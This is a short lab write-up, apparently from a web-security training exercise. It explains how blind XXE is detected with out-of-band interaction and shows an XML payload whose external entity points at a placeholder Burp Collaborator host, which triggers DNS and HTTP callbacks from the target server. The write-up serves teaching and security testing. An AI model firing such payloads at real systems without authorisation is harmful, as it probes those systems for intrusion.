## Lab 03: Blind XXE with Out-of-Band Interaction

 
### Context
 
Blind XXE is where the parser still resolves external entities but the application does not return the resolved value in the response. You cannot see the output directly. To confirm the vulnerability exists you use an out-of-band technique: point the entity at a server you control and watch for incoming connections. If the parser resolves the entity, your server gets hit.
 
Burp Collaborator is a built-in service that provides unique hostnames and records all DNS lookups and HTTP requests made to them. It is the standard tool for detecting blind XXE.
 
### What I Did
 
Generated a unique Burp Collaborator payload URL from the Collaborator client. Intercepted the stock check request and modified the XML:
 
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://YOUR-COLLABORATOR-PAYLOAD.burpcollaborator.net"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```
 
Sent the request. Opened the Collaborator client and clicked Poll Now.
 
Both a DNS lookup and an HTTP request appeared, originating from the target application's server.
 
### Why It Works
 
Even though the application did not show the entity value in the response, the parser still tried to fetch it. That fetch caused the server to perform a DNS lookup for the Collaborator hostname and then an HTTP request to it. Those interactions are visible on the Collaborator side even though nothing is returned to me in the application response. This confirms the parser is vulnerable even when there is no visible output to exploit directly.
 
